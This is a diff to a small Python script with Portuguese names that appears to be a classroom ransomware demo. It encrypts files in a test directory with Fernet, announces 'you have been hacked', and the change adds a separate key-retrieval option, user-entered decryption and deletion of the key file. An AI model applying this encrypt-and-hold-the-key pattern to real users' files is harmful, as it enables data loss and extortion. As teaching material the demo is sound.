@@ -36,11 +36,13 @@ def criptografe_diretorio(diretorio: str) -> None:
             arquivo.write(texto_criptografado)
 
 
-def descriptografe_diretorio(diretorio: str) -> None:
+def obtenha_chave_criptografia():
     with open('keys.rans', 'rb') as arquivo_chave_criptografia:
-        chave_criptografia = arquivo_chave_criptografia.read()
+        return arquivo_chave_criptografia.read()
 
-    fernet = Fernet(chave_criptografia)
+
+def descriptografe_diretorio(diretorio, chave_descriptografia):
+    fernet = Fernet(chave_descriptografia)
 
     for nome_arquivo in os.listdir(diretorio):
         caminho_arquivo = f'{diretorio}/{nome_arquivo}'
@@ -51,6 +53,8 @@ def descriptografe_diretorio(diretorio: str) -> None:
 
         with open(caminho_arquivo, 'wb') as arquivo:
             arquivo.write(texto)
+
+    os.remove('keys.rans')
 
 
 if __name__ == '__main__':
@@ -63,7 +67,8 @@ if __name__ == '__main__':
     opcao: int = -1
     while opcao != 0:
         print('1 - Criptografar')
-        print('2 - Descriptografar')
+        print('2 - Obter chave de descriptografia')
+        print('3 - Descriptografar')
         print('0 - Sair')
         opcao = int(input('Digite a opção desejada: '))
 
@@ -71,8 +76,11 @@ if __name__ == '__main__':
             garanta_existencia_diretorio(DIRETORIO_TESTE)
             criptografe_diretorio(DIRETORIO_TESTE)
             print(f'Você foi hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram criptografados!')
+        elif opcao == 2:
+            print(f'Chave de descriptografia: {obtenha_chave_criptografia().decode("utf-8")}')
         elif opcao == 3:
-            descriptografe_diretorio(DIRETORIO_TESTE)
+            chave_descriptografia = input('Digite a chave de descriptografia: ')
+            descriptografe_diretorio(DIRETORIO_TESTE, chave_descriptografia.encode('utf-8'))
             print(
                 f'Você não está mais hackeado! Todos os arquivos do diretório {DIRETORIO_TESTE} foram descriptografados!'
             )
